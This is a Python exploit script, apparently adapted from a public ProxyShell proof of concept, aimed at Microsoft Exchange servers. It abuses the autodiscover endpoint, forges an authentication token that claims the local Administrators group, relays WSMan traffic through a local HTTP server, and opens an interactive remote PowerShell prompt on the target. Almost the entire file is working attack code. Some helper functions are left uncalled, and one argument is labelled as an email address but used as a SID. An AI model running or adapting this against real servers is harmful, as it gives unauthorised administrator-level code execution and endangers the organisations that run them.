#!/usr/bin/env python3
#
# https://github.com/dmaasland/proxiesshell-poc
 
import argparse
import base64
import struct
import random
import string
import requests
import re
import threading
import sys
import xml.etree.ElementTree as ET
 
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial
 
 
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
 
 
class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxiesshell, *args, **kwargs):
        self.proxiesshell = proxiesshell
        super().__init__(*args, **kwargs)
 
    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxiesshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxiesshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)
 
        headers = {
            'Content-Type': content_type
        }
 
        r = self.proxiesshell.post(
            powershell_url,
            post_data,
            headers
        )
 
        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)
 
 
class proxiesShell:
 
    def __init__(self, exchange_url, sid, verify=False):
        self.email="aaa@exchange.lab"
        self.sid = sid
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.legacydn = None
 
        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }
 
    def post(self, endpoint, data, headers={}):
 
        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers,
            verify=False,
            proxies={"https":"http://127.0.0.1:8080"}
        )
        return r
 
    def get_token(self):
 
        self.token = self.gen_token()
 
    def get_sid(self):
 
        data = self.legacydn
        data += '\x00\x00\x00\x00\x00\xe4\x04'
        data += '\x00\x00\x09\x04\x00\x00\x09'
        data += '\x04\x00\x00\x00\x00\x00\x00'
 
        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http'
        }
 
        r = self.post(
            '/mapi/emsmdb',
            data,
            headers
        )
 
        self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
 
    def get_legacydn(self):
 
        data = self.autodiscover_body()
        headers = {'Content-Type': 'text/xml'}
        r = self.post(
            '/autodiscover/autodiscover.xml',
            data,
            headers
        )
 
        autodiscover_xml = ET.fromstring(r.content)
        self.legacydn = autodiscover_xml.find(
            '{*}Response/{*}User/{*}LegacyDN'
        ).text
 
    def autodiscover_body(self):
 
        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )
 
        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = self.email
        ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
 
        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml'
        )
 
    def gen_token(self):
 
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxiesshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'
 
        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)
 
        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data
 
        data = base64.b64encode(raw_token).decode()
 
        return data
 
 
def rand_string(n=5):
 
    return ''.join(random.choices(string.ascii_lowercase, k=n))
 
 
def exploit(proxiesshell):
 
    proxiesshell.get_token()
    print(f'Token: {proxiesshell.token}')
 
 
def start_server(proxiesshell, port):
 
    handler = partial(PwnServer, proxiesshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
 
 
def shell(command, port):
 
    # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxiesshell/
    if command.lower() in ['exit', 'quit']:
        exit()
 
    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()
 
    print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
 
 
def get_args():
 
    parser = argparse.ArgumentParser(description='proxiesShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-s', help='Email address', required=True)
    
    parser.add_argument('-p', help='Local wsman port', default=8000, type=int)
    return parser.parse_args()
 
 
def main():
 
    args = get_args()
    exchange_url = args.u
    sid = args.s
    local_port = args.p
 
    proxiesshell = proxiesShell(
        exchange_url,
        sid
    )
 
    exploit(proxiesshell)
    start_server(proxiesshell, local_port)
 
    while True:
        shell(input('PS> '), local_port)
 
 
if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
    
    main()
 